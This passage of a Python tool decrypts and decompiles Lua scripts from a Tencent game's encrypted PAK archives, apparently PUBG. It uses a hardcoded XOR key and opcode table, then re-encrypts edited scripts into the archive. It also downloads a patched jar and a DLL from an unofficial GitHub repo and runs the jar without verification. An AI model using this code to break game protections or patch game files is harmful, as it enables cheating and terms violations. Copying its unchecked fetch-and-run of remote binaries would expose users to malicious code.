                orig_dir.mkdir(parents=True, exist_ok=True)
                java_jar, _ = get_lua_tools()
                ok_count = 0
                fail_count = 0
                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                              BarColumn(), MofNCompleteColumn(), TimeElapsedColumn()) as prog2:
                    task2 = prog2.add_task("Decrypting...", total=len(lua_files))
                    for lua_file in lua_files:
                        prog2.update(task2, advance=1, description=f"[cyan]{lua_file.name[:40]}")
                        shutil.copy2(lua_file, orig_dir / lua_file.name)
                        out_path = dec_dir / lua_file.name
                        ok, err_msg, tool, lines, artifacts = decompile_lua_file(str(lua_file), str(out_path), java_jar)
                        if ok:
                            ok_count += 1
                        else:
                            fail_count += 1
                            console.print(f"[yellow]Decrypt fail {lua_file.name}: {err_msg}[/yellow]")
                console.print(f"[green]Decrypted: {ok_count} OK, {fail_count} failed -> {dec_dir}[/green]")
                edit_lua_dir = LUA_EDIT_DIR / pak_stem
                edit_lua_dir.mkdir(parents=True, exist_ok=True)
                console.print(Panel(
                    f"[bold cyan]Decrypted Files:[/bold cyan] [white]{dec_dir}[/white]\n\n"
                    f"[bold yellow]Edit files in DECOMPILED/{pak_stem}/[/bold yellow]\n\n"
                    f"[bold green]EDIT_LUA/{pak_stem}/ folder is ready[/bold green]\n"
                    f"[white]Place edited .lua files here:[/white]\n"
                    f"[dim]   {edit_lua_dir}[/dim]\n\n"
                    f"[dim]Fully developed by @Black_Toxic000[/dim]",
                    title="[bold green]Next Step[/bold green]",
                    border_style="green"))
        def repack(self, input_folder, output_pak, also_compile=False):
            if also_compile:
                console.print(f"\n[yellow]═══ Auto-Compiling LUA files ═══[/yellow]")
                pak_stem = Path(output_pak).stem
                edit_dir = Path(input_folder)
                compiled_tmp = LUA_COMPILED_DIR / pak_stem
                compiled_tmp.mkdir(parents=True, exist_ok=True)
                lua_sources = list(edit_dir.glob('*.lua'))
                console.print(f"[cyan]Compiling {len(lua_sources)} .lua files...[/cyan]")
                ok_count = 0
                fail_count = 0
                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                              BarColumn(), MofNCompleteColumn(), TimeElapsedColumn()) as prog:
                    task = prog.add_task("Compiling...", total=len(lua_sources))
                    for src_file in lua_sources:
                        prog.update(task, advance=1, description=f"[cyan]{src_file.name[:40]}")
                        out_bc = compiled_tmp / src_file.name
                        orig_t24 = LUA_ORIGINAL_DIR / pak_stem / src_file.name
                        orig_sname = extract_source_name_t24(str(orig_t24)) if orig_t24.exists() else None
                        ok, err_msg, tool = compile_with_optimizer(str(src_file), str(out_bc), orig_sname)
                        if ok:
                            ok_count += 1
                        else:
                            fail_count += 1
                            console.print(f"[yellow]Compile fail {src_file.name}: {err_msg}[/yellow]")
                console.print(f"[green]Compiled: {ok_count} OK, {fail_count} failed[/green]")
                if ok_count == 0:
                    console.print("[red]No files compiled — repack aborted[/red]")
                    return
                input_folder = str(compiled_tmp)
            logger = RepackLogger()
            console.print(f"[cyan]Repacking from {input_folder}[/cyan]")
            MemoryManager.print_memory_status()
            input_path = Path(input_folder)
            if not input_path.exists():
                raise FileNotFoundError(f'Input folder not found: {input_folder}')
            manifest_reader = None
            manifest_path = MANIFEST_DIR / Path(output_pak).stem / 'manifest.json'
            if manifest_path.exists():
                try: manifest_reader = ManifestReader(manifest_path)
                except Exception as e: console.print(f"[yellow]Manifest error: {e}[/yellow]")
            console.print("[cyan]Copying original pak...[/cyan]")
            temp_pak = Path(str(output_pak) + '.tmp')
            shutil.copy2(self._file_path, temp_pak)
            console.print("[green]Base copied[/green]")
            mod_files = list(input_path.rglob('*'))
            mod_files = [f for f in mod_files if f.is_file() and f.suffix.lower() == '.lua']
            console.print(f"[cyan]Found {len(mod_files)} .lua files to repack[/cyan]")
            if not mod_files:
                console.print("[yellow]Nothing to repack[/yellow]")
                temp_pak.unlink(missing_ok=True)
                logger.print_summary()
                return
            work_items = []
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                          BarColumn(), MofNCompleteColumn()) as prog:
                task = prog.add_task("Processing...", total=len(mod_files))
                for mod_file in mod_files:
                    mod_name = mod_file.name
                    prog.update(task, advance=1, description=f"[cyan]{mod_name[:40]}")
                    try: mod_bytes = mod_file.read_bytes()
                    except Exception as e:
                        console.print(f"[red]Read error {mod_name}: {e}[/red]"); continue
                    try:
                        rel_path_str = str(mod_file.relative_to(input_path)).replace('\\', '/')
                    except ValueError:
                        rel_path_str = mod_name
                    entries = []
                    for dp, df in self._index.items():
                        for fn, ent in df.items():
                            if fn == mod_name or str(dp/fn).replace('\\','/') == rel_path_str:
                                entries.append((dp/fn, ent))
                    if not entries:
                        logger.log_failure(mod_name, 'No matching PAK entry', {}); continue
                    success_flag = False
                    block_logger = BlockLogger(mod_name)
                    for epath, eentry in entries:
                        if eentry.encrypted and eentry.encryption_method == 17: continue
                        blocks = eentry.compressed_blocks
                        comp_m = eentry.compression_method
                        enc_m = eentry.encryption_method if eentry.encrypted else 0
                        bsz = eentry.compression_block_size
                        comp_method_str = {0:'NONE',1:'ZLIB',6:'ZSTD',8:'ZSTD_DICT'}.get(comp_m,'UNKNOWN')
                        if not blocks:
                            slot = eentry.size
                            overshoot = len(mod_bytes) - slot
                            if overshoot > 0:
                                risk = "SAFE" if overshoot < 512 else ("MID" if overshoot < 4096 else "HIGH")
                                console.print(f"[yellow]{mod_name}: +{overshoot}B over slot — risk {risk} — forcing write[/yellow]")
                            result = mod_bytes
                            if eentry.encrypted:
                                cs = PakCrypto.align_encrypted_content_size(slot, enc_m)
                                padded = result + b'\x00'*(cs-len(result))
                                cipher = PakCrypto.encrypt_block(padded, epath, enc_m)
                                result = cipher + b'\x00'*(slot-cs)
                            work_items.append((epath, [(eentry.offset, result)], False))
                            block_logger.add_block(0, len(mod_bytes), slot, 'NONE', -1, True, eentry.offset, eentry.offset+slot)
                            logger.log_success(mod_name, slot, slot)
                            success_flag = True; break
                        elif len(blocks) == 1:
                            block = blocks[0]
                            slot = block.end - block.start
                            us = PakCrypto.align_encrypted_content_size(slot, enc_m) if eentry.encrypted else slot
                            result, lvl = self._compress_to_fit(mod_bytes, comp_m, us)
                            if result is None:
                                result, lvl = self._compress_to_fit_force(mod_bytes, comp_m)
                                overshoot = len(result) - us if result else len(mod_bytes) - us
                                risk = "SAFE" if overshoot < 512 else ("MID" if overshoot < 4096 else "HIGH")
                                console.print(f"[yellow]{mod_name}: compressed still +{overshoot}B over slot — risk {risk} — forcing write[/yellow]")
                            cls = len(result)
                            if eentry.encrypted:
                                cs = PakCrypto.align_encrypted_content_size(slot, enc_m)
                                padded = result + b'\x00'*(cs-len(result))
                                cipher = PakCrypto.encrypt_block(padded, epath, enc_m)
                                result = cipher + b'\x00'*(slot-cs)
                            else:
                                result = result + b'\x00'*(slot-len(result))
                            block_logger.add_block(0, len(mod_bytes), cls, comp_method_str, lvl, True, block.start, block.end)
                            work_items.append((epath, [(block.start, result)], False))
                            logger.log_success(mod_name, slot, slot)
                            success_flag = True; break
                        else:
                            block_indices = PakCrypto.generate_block_indices(len(blocks), enc_m)
                            chunks = [bytes(c) if isinstance(c,tuple) else c for c in it.batched(mod_bytes, bsz)]
                            if len(chunks) > len(blocks):
                                logger.log_failure(mod_name,'Too many chunks',{'chunks':len(chunks),'blocks':len(blocks)}); continue
                            comp_chunks = []
                            all_fit = True
                            for idx, chunk in enumerate(chunks):
                                si = block_indices[idx] if idx < len(block_indices) else idx
                                blk = blocks[si]
                                slot = blk.end - blk.start
                                us = PakCrypto.align_encrypted_content_size(slot, enc_m) if eentry.encrypted else slot
                                result, lvl = self._compress_to_fit(chunk, comp_m, us)
                                if result is None: all_fit = False; break
                                cls = len(result)
                                if eentry.encrypted:
                                    cs = PakCrypto.align_encrypted_content_size(slot, enc_m)
                                    padded = result + b'\x00'*(cs-len(result))
                                    cipher = PakCrypto.encrypt_block(padded, epath, enc_m)
                                    result = cipher + b'\x00'*(slot-cs)
                                else:
                                    result = result + b'\x00'*(slot-len(result))
                                block_logger.add_block(idx, len(chunk), cls, comp_method_str, lvl, True, blk.start, blk.start+us)
                                comp_chunks.append((blk.start, result))
                            if not all_fit:
                                console.print(f"[yellow]{mod_name}: multi-block force — some blocks over slot size[/yellow]")
                                comp_chunks = []
                                for idx, chunk in enumerate(chunks):
                                    si = block_indices[idx] if idx < len(block_indices) else idx
                                    blk = blocks[si]
                                    slot = blk.end - blk.start
                                    us = PakCrypto.align_encrypted_content_size(slot, enc_m) if eentry.encrypted else slot
                                    result, lvl = self._compress_to_fit_force(chunk, comp_m)
                                    if result is None: result = chunk
                                    overshoot = len(result) - us
                                    if overshoot > 0:
                                        risk = "SAFE" if overshoot < 512 else ("MID" if overshoot < 4096 else "HIGH")
                                        console.print(f"[yellow]  block {idx}: +{overshoot}B over — {risk}[/yellow]")
                                    if eentry.encrypted:
                                        cs = PakCrypto.align_encrypted_content_size(slot, enc_m)
                                        padded = result + b'\x00'*(cs-len(result))
                                        result = PakCrypto.encrypt_block(padded, epath, enc_m) + b'\x00'*(slot-cs)
                                    else:
                                        result = result + b'\x00'*(slot-len(result)) if len(result) < slot else result
                                    comp_chunks.append((blk.start, result))
                                all_fit = True
                            if all_fit:
                                work_items.append((epath, comp_chunks, True))
                                logger.log_success(mod_name, sum(b.end-b.start for b in blocks), sum(b.end-b.start for b in blocks))
                                success_flag = True; break
                        if blocks: block_logger.print_summary()
                    if not success_flag:
                        console.print(f"[yellow]Repack failed for: {mod_name}[/yellow]")
            if not work_items:
                console.print("[yellow]Nothing to write[/yellow]")
                temp_pak.unlink(missing_ok=True)
            else:
                console.print(f"[cyan]Writing {len(work_items)} files...[/cyan]")
                try:
                    with open(temp_pak, 'r+b') as fp:
                        for _, block_data, _ in work_items:
                            for offset, data in block_data:
                                fp.seek(offset)
                                fp.write(data)
                    temp_pak.replace(output_pak)
                    console.print(f"[green]Repack complete! -> {output_pak}[/green]")
                    logger.print_summary()
                except Exception as e:
                    console.print(f"[red]Write error: {e}[/red]")
                    traceback.print_exc()
        def _compress_to_fit(self, data, comp_m, target_size):
            if comp_m == CM_NONE:
                return (data, -1) if len(data) <= target_size else (None, -1)
            max_lvl = 9 if comp_m == CM_ZLIB else 22
            for lvl in range(max_lvl, 0, -1):
                try:
                    if comp_m == CM_ZLIB: comp = zlib.compress(data, level=min(lvl,9))
                    elif comp_m == CM_ZSTD: comp = ZstdCompressor(level=lvl).compress(data)
                    elif comp_m == CM_ZSTD_DICT and self._zstd_dict is not None:
                        comp = ZstdCompressor(level=lvl, dict_data=self._zstd_dict).compress(data)
                    else: break
                    if len(comp) <= target_size: return (comp, lvl)
                except Exception: continue
            return (None, -1)
        def _compress_to_fit_force(self, data, comp_m):
            if comp_m == CM_NONE: return (data, -1)
            max_lvl = 9 if comp_m == CM_ZLIB else 22
            try:
                if comp_m == CM_ZLIB: return (zlib.compress(data, level=9), 9)
                elif comp_m == CM_ZSTD: return (ZstdCompressor(level=max_lvl).compress(data), max_lvl)
                elif comp_m == CM_ZSTD_DICT and self._zstd_dict is not None:
                    return (ZstdCompressor(level=max_lvl, dict_data=self._zstd_dict).compress(data), max_lvl)
            except Exception: pass
            return (data, -1)

    class BlockLogger:
        def __init__(self, filename):
            self.filename = filename
            self.blocks = []
            self.original_total_size = 0
            self.compressed_total_size = 0
        def add_block(self, block_index, original_size, compressed_size,
                      compression_method, level, success_flag, block_offset, block_end):
            self.blocks.append({
                'index': block_index, 'original_size': original_size,
                'compressed_size': compressed_size, 'compression_method': compression_method,
                'level': level, 'success': success_flag,
                'block_offset': block_offset, 'block_end': block_end,
                'slot_size': block_end - block_offset,
            })
        def print_summary(self):
            t = Table(title=f"Blocks: {Path(self.filename).name}", show_header=True,
                      header_style=f"bold cyan", box=box.SIMPLE)
            t.add_column("Block", style="cyan", width=6)
            t.add_column("Original", justify="right", width=12)
            t.add_column("Compressed", justify="right", width=12)
            t.add_column("Slot", justify="right", width=12)
            t.add_column("Free", justify="right", width=10)
            t.add_column("Method", width=14)
            t.add_column("OK", width=4)
            for b in self.blocks:
                free = b['slot_size'] - b['compressed_size']
                free_str = (f"[green]+{free:,}[/green]" if free >= 100
                            else f"[yellow]+{free:,}[/yellow]" if free >= 0
                            else f"[red]{free:,}[/red]")
                t.add_row(str(b['index']), f"{b['original_size']:,}",
                          f"{b['compressed_size']:,}", f"{b['slot_size']:,}",
                          free_str, b['compression_method'][:13],
                          "YES" if b['success'] else "NO")
            console.print(t)

    class RepackLogger:
        def __init__(self):
            self.successes = []
            self.failures = []
        def log_success(self, file_name, compressed_size, slot_size):
            self.successes.append({'file': file_name, 'compressed': compressed_size, 'slot': slot_size})
        def log_failure(self, file_name, reason, details):
            self.failures.append({'file': file_name, 'reason': reason, 'details': details})
        def print_summary(self):
            if self.successes:
                t = Table(title="Successful Repacks", show_header=True,
                          header_style="bold green", box=box.SIMPLE)
                t.add_column("File", style="cyan")
                t.add_column("Compressed", justify="right")
                t.add_column("Slot", justify="right")
                for s in self.successes:
                    t.add_row(Path(s['file']).name, f"{s['compressed']:,}", f"{s['slot']:,}")
                console.print(t)
            if self.failures:
                t = Table(title="Failed Repacks", show_header=True,
                          header_style="bold red", box=box.SIMPLE)
                t.add_column("File", style="cyan")
                t.add_column("Reason")
                t.add_column("Details", style="dim")
                for f in self.failures:
                    dstr = ", ".join(f"{k}:{v}" for k, v in f['details'].items())
                    t.add_row(Path(f['file']).name, f['reason'], dstr or "-")
                console.print(t)
            total = len(self.successes) + len(self.failures)
            rate = (len(self.successes) / total * 100) if total > 0 else 0
            console.print(Panel(
                f"[green]Success: {len(self.successes)}[/green]  "
                f"[red]Failed: {len(self.failures)}[/red]  Rate: {rate:.1f}%",
                title="Repack Summary", border_style="cyan"))

    class ManifestGenerator:
        def __init__(self, pak_name, output_path=None):
            self.pak_name = pak_name
            self.output_path = output_path
            self.manifest = {
                'pak_file': pak_name, 'created_at': datetime.now().isoformat(),
                'version': '3.0', 'total_files': 0, 'total_blocks': 0,
                'compression_stats': {}, 'encryption_stats': {},
                'extraction_mode': 'full', 'files': {}, 'block_files': {}, 'block_file_mappings': {}
            }
        def set_extraction_mode(self, use_block_splitting):
            self.manifest['extraction_mode'] = 'blocks' if use_block_splitting else 'full'
        def add_file_entry(self, file_path, entry, actual_offset, actual_size):
            if entry.encrypted and entry.encryption_method == 17: return
            file_key = str(file_path).replace('\\', '/')
            comp_names = {0:'CM_NONE',1:'CM_ZLIB',6:'CM_ZSTD',8:'CM_ZSTD_DICT'}
            enc_names = {1:'EM_SIMPLE1',2:'EM_SM4_2',4:'EM_SM4_4',16:'EM_SIMPLE2',17:'EM_UNKNOWN_17',0:'NONE'}
            for v in range(31, 46): enc_names[v] = f'EM_SM4_NEW_{v}'
            block_info = []
            if hasattr(entry, 'compressed_blocks') and entry.compressed_blocks:
                for i, blk in enumerate(entry.compressed_blocks):
                    block_info.append({'index': i, 'start': blk.start, 'end': blk.end,
                                       'size': blk.end - blk.start,
                                       'max_size': entry.compression_block_size if entry.compression_block_size > 0 else blk.end - blk.start})
            self.manifest['files'][file_key] = {
                'offset': actual_offset, 'total_size': actual_size,
                'uncompressed_size': entry.uncompressed_size,
                'compression_method': entry.compression_method,
                'compression_method_name': comp_names.get(entry.compression_method, f'UNKNOWN_{entry.compression_method}'),
                'compression_block_size': entry.compression_block_size,
                'encrypted': entry.encrypted,
                'encryption_method': entry.encryption_method if entry.encrypted else 0,
                'encryption_method_name': enc_names.get(entry.encryption_method if entry.encrypted else 0, 'NONE'),
                'blocks': block_info, 'num_blocks': len(block_info),
                'content_hash': entry.content_hash.hex() if hasattr(entry,'content_hash') and entry.content_hash else None,
            }
            self.manifest['total_files'] += 1
            self.manifest['total_blocks'] += len(block_info)
            cm_key = comp_names.get(entry.compression_method, f'UNKNOWN_{entry.compression_method}')
            self.manifest['compression_stats'][cm_key] = self.manifest['compression_stats'].get(cm_key, 0) + 1
        def save(self, output_path):
            try:
                output_path = Path(output_path)
                output_path.mkdir(parents=True, exist_ok=True)
                manifest_file = output_path / 'manifest.json'
                with open(manifest_file, 'w', encoding='utf-8') as f:
                    json.dump(self.manifest, f, indent=2, ensure_ascii=False)
                console.print(f"[green]Manifest saved -> {manifest_file}[/green]")
                return manifest_file
            except Exception as e:
                console.print(f"[red]Manifest save error: {e}[/red]")
                return None

    class ManifestReader:
        def __init__(self, manifest_path):
            self.manifest_path = Path(manifest_path)
            self.manifest = {}
            self.extraction_mode = 'full'
            self.block_files = {}
            self.block_file_mappings = {}
            self.load()
        def load(self):
            if not self.manifest_path.exists():
                raise FileNotFoundError(f'Manifest not found: {self.manifest_path}')
            with open(self.manifest_path, 'r', encoding='utf-8') as f:
                self.manifest = json.load(f)
            if self.manifest.get('version') == '2.1':
                self.manifest.setdefault('block_files', {})
                self.manifest.setdefault('block_file_mappings', {})
                self.manifest['version'] = '3.0'
            self.extraction_mode = self.manifest.get('extraction_mode', 'full')
            self.block_files = self.manifest.get('block_files', {})
            self.block_file_mappings = self.manifest.get('block_file_mappings', {})
            mode_label = "BLOCKS" if self.extraction_mode == 'blocks' else "FULL FILES"
            console.print(f"[cyan]Manifest loaded — {len(self.manifest.get('files',{}))} files — mode: {mode_label}[/cyan]")
        def find_file_info(self, file_path, quiet_on_exact_match=False):
            if file_path in self.manifest['files']: return self.manifest['files'][file_path]
            normalized = file_path.replace('\\', '/')
            for path in self.manifest['files']:
                if path.replace('\\', '/') == normalized: return self.manifest['files'][path]
            filename = Path(file_path).name
            matches = [(p, i) for p, i in self.manifest['files'].items() if Path(p).name == filename]
            if len(matches) > 1 and not quiet_on_exact_match:
                console.print(f"[yellow]Multiple manifest entries for '{filename}'[/yellow]")
            return matches[0][1] if matches else None

# ============================================================
# LUA TOOL CORE
# ============================================================

GITHUB_RAW_BASE = "https://raw.githubusercontent.com/DANGERMODVIP/wewe/main"
LUA_XOR_KEY = bytes.fromhex("112136474657a78d9d8490d8ab008c35261af7e45805b8b31507d02c1e8ff6c8")

def get_lua_tools():
    """Download required Lua tools if missing"""
    LUA_TEMP_DIR.mkdir(parents=True, exist_ok=True)
    JAVA_JAR = LUA_TEMP_DIR / "unluac_patched.jar"
    LUA53_DLL = LUA_TEMP_DIR / "lua53.dll"
    files = {
        JAVA_JAR: f"{GITHUB_RAW_BASE}/unluac_patched.jar",
        LUA53_DLL: f"{GITHUB_RAW_BASE}/lua53.dll",
    }
    for local_path, url in files.items():
        if local_path.exists():
            continue
        try:
            if not HAS_REQUESTS:
                continue
            r = requests.get(url, timeout=30)
            if r.status_code == 200:
                with open(local_path, 'wb') as f:
                    f.write(r.content)
                console.print(f"[cyan]Downloaded {local_path.name}[/cyan]")
            else:
                console.print(f"[yellow]Failed to download {local_path.name} (HTTP {r.status_code})[/yellow]")
        except Exception as e:
            console.print(f"[yellow]Error downloading {local_path.name}: {e}[/yellow]")
    return JAVA_JAR, LUA53_DLL

def convert_t24_to_standard(src_path, dst_path):
    """Convert Tencent Lua 5.3 to standard Lua 5.3 bytecode"""
    try:
        with open(src_path, 'rb') as f:
            d = bytearray(f.read())
        if d[:4] != b'\x1bLua' or d[4] != 0x53:
            return False, 'Not Lua 5.3 bytecode'
        out = bytearray()
        pos = [34]
        out.extend(d[:34])
        def rb():
            v = d[pos[0]]
            pos[0] += 1
            return v
        def ri32():
            v = struct.unpack_from('<i', d, pos[0])[0]
            pos[0] += 4
            return v
        def ri64():
            v = struct.unpack_from('<q', d, pos[0])[0]
            pos[0] += 8
            return v
        def rf64():
            v = struct.unpack_from('<d', d, pos[0])[0]
            pos[0] += 8
            return v
        def wb(v):
            out.append(v & 0xFF)
        def wi32(v):
            out.extend(struct.pack('<i', v))
        def wi64(v):
            out.extend(struct.pack('<q', v))
        def wf64(v):
            out.extend(struct.pack('<d', v))
        def wu32(v):
            out.extend(struct.pack('<I', v))
        def xdecwrite():
            sz = d[pos[0]]
            if sz == 0:
                pos[0] += 1
                out.append(0)
                return
            if sz == 0xFF:
                length = struct.unpack_from('<Q', d, pos[0]+1)[0] - 1
                ds = pos[0] + 9
                pos[0] = ds + length
                out.append(0xFF)
                out.extend(struct.pack('<Q', length + 1))
            else:
                length = sz - 1
                ds = pos[0] + 1
                pos[0] = ds + length
                out.append(sz)
            for i in range(length):
                out.append(d[ds + i] ^ LUA_XOR_KEY[i % len(LUA_XOR_KEY)])
        std_opcode_names = [
            "MOVE", "LOADK", "LOADKX", "LOADBOOL", "LOADNIL",
            "GETUPVAL", "GETTABUP", "GETTABLE", "SETTABUP", "SETUPVAL",
            "SETTABLE", "NEWTABLE", "SELF", "ADD", "SUB",
            "MUL", "MOD", "POW", "DIV", "IDIV",
            "BAND", "BOR", "BXOR", "SHL", "SHR",
            "UNM", "BNOT", "NOT", "LEN", "CONCAT",
            "JMP", "EQ", "LT", "LE", "TEST",
            "TESTSET", "CALL", "TAILCALL", "RETURN", "FORLOOP",
            "FORPREP", "TFORCALL", "TFORLOOP", "SETLIST", "CLOSURE",
            "VARARG", "EXTRAARG"
        ]
        t24_name_shuffled = {
            0: "ADD", 1: "SUB", 2: "MUL", 5: "DIV", 7: "BAND", 10: "SHL",
            12: "UNM", 14: "NOT", 15: "LEN", 16: "CONCAT",
            17: "MOVE", 18: "LOADK", 20: "LOADBOOL", 21: "LOADNIL",
            22: "GETUPVAL", 23: "GETTABUP", 24: "GETTABLE",
            8: "SETTABUP", 9: "SETUPVAL", 27: "SETTABLE", 28: "NEWTABLE", 29: "SELF",
            30: "JMP", 31: "EQ", 32: "LT", 33: "LE", 34: "TEST", 35: "TESTSET",
            36: "CALL", 37: "TAILCALL", 38: "RETURN",
            39: "FORLOOP", 40: "FORPREP", 41: "TFORCALL", 42: "TFORLOOP",
            43: "SETLIST", 44: "CLOSURE", 45: "VARARG",
        }
        t24_to_std = {t24: std_opcode_names.index(nm) for t24, nm in t24_name_shuffled.items() if nm in std_opcode_names}
        def remap(ins):
            t24_op = ins & 0x3F
            std_op = t24_to_std.get(t24_op, t24_op)
            return (ins & ~0x3F) | std_op
        def rebuild():
            xdecwrite()
            wi32(ri32())
            wi32(ri32())
            wb(rb())
            wb(rb())
            wb(rb())
            n = ri32()
            wi32(n)
            for _ in range(n):
                ins = struct.unpack_from('<I', d, pos[0])[0]
                pos[0] += 4
                out.extend(struct.pack('<I', remap(ins)))
            n = ri32()
            wi32(n)
            for _ in range(n):
                t = rb()
                wb(t)
                if t == 0:
                    pass
                elif t == 1:
                    wb(rb())
                elif t == 3:
                    wf64(rf64())
                elif t == 19:
                    wi64(ri64())
                elif t in (4, 20):
                    xdecwrite()
                else:
                    raise ValueError(f'Unknown const type {t}')
            n = ri32()
            wi32(n)
            for _ in range(n):
                wb(rb())
                wb(rb())
            n = ri32()
            wi32(n)
            for _ in range(n):
                rebuild()
            n = ri32()
            t24_lines = list(d[pos[0]:pos[0] + n])
            pos[0] += n
            abs_n = ri32()
            pos[0] += abs_n * 8
            wi32(n)
            for ln in t24_lines:
                out.extend(struct.pack('<i', ln))
            n = ri32()
            wi32(n)
            for _ in range(n):
                xdecwrite()
                wi32(ri32())
                wi32(ri32())
            n = ri32()
            wi32(n)
            for _ in range(n):
                xdecwrite()
        try:
            rebuild()
            with open(dst_path, 'wb') as f:
                f.write(out)
            return True, f'{len(d)}B -> {len(out)}B'
        except Exception as e:
            return False, str(e)
    except Exception as e:
        return False, str(e)

def run_unluac(std_luac_path, java_jar_path):
    """Run unluac patched jar to decompile"""
    if not java_jar_path.exists():
        return None, f'unluac_patched.jar not found: {java_jar_path}'
    try:
        result = subprocess.run(
            ['java', '-jar', str(java_jar_path), str(std_luac_path)],
            capture_output=True, timeout=60
        )
        raw = result.stdout.decode('utf-8', errors='replace')
        noise_patterns = [
            r'No pubg_map\.properties found\. Using standard map\.',
            r'Using standard map\.',
            r'No pubg_map\.properties found\.',
        ]
        for pattern in noise_patterns:
            raw = re.sub(pattern, '', raw)
        lines = [l for l in raw.split('\n') if l.strip() != '' or l == '']
        clean = []
        i = 0
        while i < len(lines):
            stripped = lines[i].rstrip()
            if re.search(r'\s*local\s+\w+\s*=\s*$', stripped):
                j = i + 1
                while j < len(lines) and lines[j].strip() == '':
                    j += 1
                next_stripped = lines[j].strip() if j < len(lines) else ''
                if next_stripped.startswith('function'):
                    clean.append(stripped + ' ' + lines[j].lstrip())
                    i = j + 1
                    continue
                i += 1
                continue
            clean.append(lines[i])
            i += 1
        code = '\n'.join(clean)
        if not code.strip():
            return None, f'unluac empty output (exit={result.returncode})'
        credit_top = '--[[ Decompiled by TOXIC TOOL ]]--\n'
        credit_mid = '--[[ Fully developed by @Black_Toxic000 ]]--\n'
        code = credit_top + credit_mid + code
        return code, ''
    except FileNotFoundError:
        return None, 'java not found'
    except subprocess.TimeoutExpired:
        return None, 'unluac timeout (>60s)'
    except Exception as e:
        return None, str(e)

def decompile_lua_file(in_path, out_path, java_jar_path):
    """Decompile a Lua file"""
    jar_ok = java_jar_path.exists()
    with tempfile.NamedTemporaryFile(suffix='.luac', delete=False) as tf:
        tmp_std = tf.name
    conv_ok = False
    conv_msg = ''
    try:
        conv_ok, conv_msg = convert_t24_to_standard(in_path, tmp_std)
    except Exception as e:
        conv_ok = False
        conv_msg = str(e)
    if conv_ok and jar_ok:
        code, err = run_unluac(tmp_std, java_jar_path)
        if code:
            try:
                with open(out_path, 'w', encoding='utf-8') as f:
                    f.write(code)
                if os.path.exists(tmp_std):
                    os.unlink(tmp_std)
                return True, '', 'unluac_patched', len(code.splitlines()), 0
            except Exception:
                pass
    if os.path.exists(tmp_std):
        os.unlink(tmp_std)
    return False, conv_msg or 'Decompile failed', 'none', 0, 0

def find_luac_compiler():
    """Find Lua 5.3 compiler"""
    paths = [
        'luac5.3', 'luac',
        '/data/data/com.termux/files/usr/bin/luac5.3',
        '/data/data/com.termux/files/usr/bin/luac',
        '/usr/bin/luac5.3',
        '/usr/bin/luac',
        '/usr/local/bin/luac5.3',
        '/usr/local/bin/luac'
    ]
    for cmd in paths:
        try:
            result = subprocess.run([cmd, '-v'], capture_output=True, timeout=3)
            if b'5.3' in result.stdout + result.stderr:
                return cmd
        except Exception:
            continue
    return None

def compile_lua_file(src_path, out_path, orig_source_name=None):
    """Compile Lua file to bytecode"""
    try:
        with open(src_path, 'rb') as f:
            magic = f.read(4)
        if magic == b'\x1bLua':
            return False, "File is already compiled bytecode.", ''
    except OSError as e:
        return False, f'File read error: {e}', ''
    compiler = find_luac_compiler()
    if compiler is None:
        return False, "Lua 5.3 compiler not found. Install: pkg install lua53", ''
    with tempfile.NamedTemporaryFile(suffix='.luac', delete=False) as tf:
        tmp_out = tf.name
    try:
        result = subprocess.run(
            [compiler, '-s', '-o', tmp_out, src_path],
            capture_output=True, timeout=30
        )
        if result.returncode != 0:
            err = result.stderr.decode('utf-8', errors='replace')
            return False, f'luac error: {err.strip()[:200]}', compiler
        with open(tmp_out, 'rb') as f:
            std_bytes = f.read()
        if std_bytes[:4] != b'\x1bLua' or std_bytes[4] != 0x53:
            return False, 'luac did not produce valid Lua 5.3 bytecode', compiler
        if orig_source_name:
            std_bytes = patch_source_name(std_bytes, orig_source_name)
        t24_bytes = rebuild_std_to_t24(std_bytes)
        if not t24_bytes:
            return False, 'T24 rebuild failed', compiler
        with open(out_path, 'wb') as f:
            f.write(t24_bytes)
        return True, '', compiler
    finally:
        if os.path.exists(tmp_out):
            os.unlink(tmp_out)

def patch_source_name(std_bytes, new_source_name):
    """Patch source name in bytecode"""
    d = bytearray(std_bytes)
    pos = 34
    input_size_t = d[13]
    sz = d[pos]
    if sz == 0:
        old_total = 1
    elif sz == 0xFF:
        if input_size_t == 8:
            old_len = struct.unpack_from('<Q', d, pos + 1)[0] - 1
            old_total = 1 + 8 + old_len
        else:
            old_len = struct.unpack_from('<I', d, pos + 1)[0] - 1
            old_total = 1 + 4 + old_len
    else:
        old_len = sz - 1
        old_total = 1 + old_len
    new_name_bytes = new_source_name.encode('utf-8') if new_source_name else b''
    new_len = len(new_name_bytes)
    if new_len == 0:
        new_str_bytes = bytes([0])
    elif new_len + 1 < 0xFF:
        new_str_bytes = bytes([new_len + 1]) + new_name_bytes
    else:
        if input_size_t == 8:
            new_str_bytes = bytes([0xFF]) + struct.pack('<Q', new_len + 1) + new_name_bytes
        else:
            new_str_bytes = bytes([0xFF]) + struct.pack('<I', new_len + 1) + new_name_bytes
    return bytes(d[:pos]) + new_str_bytes + bytes(d[pos + old_total:])

def rebuild_std_to_t24(std_bytecode):
    """Rebuild standard Lua bytecode to T24 format"""
    d = bytearray(std_bytecode)
    out = bytearray()
    pos = [34]
    out.extend(d[:34])
    input_size_t = d[13]
    out[13] = 4
    def rb():
        v = d[pos[0]]
        pos[0] += 1
        return v
    def ri32():
        v = struct.unpack_from('<i', d, pos[0])[0]
        pos[0] += 4
        return v
    def ri64():
        v = struct.unpack_from('<q', d, pos[0])[0]
        pos[0] += 8
        return v
    def rf64():
        v = struct.unpack_from('<d', d, pos[0])[0]
        pos[0] += 8
        return v
    def wi32(v):
        out.extend(struct.pack('<i', v))
    def wu32(v):
        out.extend(struct.pack('<I', v))
    def wi64(v):
        out.extend(struct.pack('<q', v))
    def wf64(v):
        out.extend(struct.pack('<d', v))
    def xenc():
        sz = d[pos[0]]
        if sz == 0:
            pos[0] += 1
            out.append(0)
            return
        if sz == 0xFF:
            if input_size_t == 8:
                length = struct.unpack_from('<Q', d, pos[0]+1)[0] - 1
                ds = pos[0] + 9
                pos[0] = ds + length
            else:
                length = struct.unpack_from('<I', d, pos[0]+1)[0] - 1
                ds = pos[0] + 5
                pos[0] = ds + length
            out.append(0xFF)
            out.extend(struct.pack('<Q', length + 1))
        else:
            length = sz - 1
            ds = pos[0] + 1
            pos[0] = ds + length
            out.append(sz)
